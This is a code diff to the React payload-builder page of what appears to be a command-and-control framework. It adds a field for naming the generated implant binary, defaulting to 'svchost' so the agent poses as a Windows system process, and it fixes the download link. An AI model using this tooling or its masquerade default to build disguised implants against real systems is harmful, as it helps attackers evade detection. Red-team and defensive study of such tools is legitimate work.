@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { payloadsApi } from '../utils/api';
+import { payloadsApi, API_BASE } from '../utils/api';
 import { 
   Download, 
   Cpu, 
@@ -15,7 +15,8 @@ import {
   Settings2,
   ChevronDown,
   ChevronUp,
-  Activity
+  Activity,
+  User
 } from 'lucide-react';
 
 const PayloadPage = () => {
@@ -38,6 +39,7 @@ const PayloadPage = () => {
   const [result, setResult] = useState(null);
   const [error, setError] = useState(null);
   const [showAdvanced, setShowAdvanced] = useState(false);
+  const [agentName, setAgentName] = useState('svchost');
 
   const startLogSimulation = () => {
     const logs = [
@@ -47,11 +49,12 @@ const PayloadPage = () => {
       `[*] Setting C2_POOL = ${serverUrls.join(',')}`,
       `[*] Setting BEACON_INTERVAL = ${interval}s`,
       `[*] Setting JITTER = ${jitter}%`,
+      `[*] Setting AGENT_IDENTITY = ${agentName}`,
       workHoursEnabled ? `[*] Applying Operating Window: ${workStart}:00 - ${workEnd}:00` : "[*] Operating Window: UNRESTRICTED",
       "[*] Resolving dependencies...",
       "[*] Compiling with GOOS=" + platform + " GOARCH=amd64...",
       "[*] Stripping symbols and optimizing binary...",
-      "[*] Generating unique agent signature...",
+      `[*] Sealing artifact as ${agentName}${platform === 'windows' ? '.exe' : ''}...`,
       "[+] Build successful. Artifact ready for deployment."
     ];
     
@@ -80,6 +83,7 @@ const PayloadPage = () => {
         jitter,
         psk,
         discoveryUrl,
+        agentName,
         workHours: {
           enabled: workHoursEnabled,
           start: workStart,
@@ -96,7 +100,10 @@ const PayloadPage = () => {
 
   const handleDownload = () => {
     if (!result) return;
-    const downloadUrl = `http://${window.location.hostname}:3001${result.downloadUrl}`;
+    // result.downloadUrl is e.g. /api/payloads/download/filename
+    // API_BASE is e.g. http://localhost:3001/api or /api
+    const baseUrl = API_BASE.endsWith('/api') ? API_BASE.slice(0, -4) : '';
+    const downloadUrl = `${baseUrl}${result.downloadUrl}`;
     window.open(downloadUrl, '_blank');
   };
 
@@ -139,6 +146,20 @@ const PayloadPage = () => {
                       {p} x64
                     </button>
                   ))}
+                </div>
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Agent Identity (Binary Name)</label>
+                <div className="relative group">
+                  <User className="absolute left-4 top-3.5 w-4 h-4 text-slate-600 group-focus-within:text-primary transition-colors" />
+                  <input
+                    type="text"
+                    value={agentName}
+                    onChange={(e) => setAgentName(e.target.value)}
+                    className="w-full bg-black/20 border border-slate-800/50 rounded-2xl pl-12 pr-4 py-3.5 text-xs text-white outline-none focus:border-primary/50 font-mono transition-all"
+                    placeholder="e.g. svchost"
+                  />
                 </div>
               </div>
 
@@ -327,6 +348,7 @@ const PayloadPage = () => {
             </div>
             <pre className="text-[11px] font-mono text-primary/70 bg-black/40 p-6 rounded-2xl border border-primary/10 overflow-x-auto scrollbar-thin">
 {JSON.stringify({
+  identity: agentName,
   architecture: platform,
   c2_pool: serverUrls,
   beacon_window: `${interval}s [Jitter: ${jitter}%]`,
